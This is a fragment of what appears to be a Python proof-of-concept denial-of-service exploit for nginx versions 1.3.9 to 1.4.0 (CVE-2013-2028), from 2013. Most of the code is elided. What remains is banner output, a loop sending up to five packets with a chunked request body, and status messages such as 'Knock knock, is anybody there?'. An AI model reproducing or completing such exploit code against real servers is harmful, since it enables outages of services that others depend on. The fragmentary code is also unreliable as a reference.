...
# Date: 16.05.2013
# Exploit Author: Mert SARICA - mert [ . ] sarica [ @ ] gmail [ . ] com 
...
print 
"======================================================================"
print u"nginx v1.3.9-1.4.0 DOS POC (CVE-2013-2028) 
[http://www.mertsarica.com]"
print 
"======================================================================"
...
while packet <= 5:
    ...
    if debug:
        print "data length:", len(body), "chunk size:", 
...
"application/x-www-form-urlencoded")
    ...
    try:
        ...
        print "[*] Knock knock, is anybody there ? (" + str(packet) + 
"/5)"
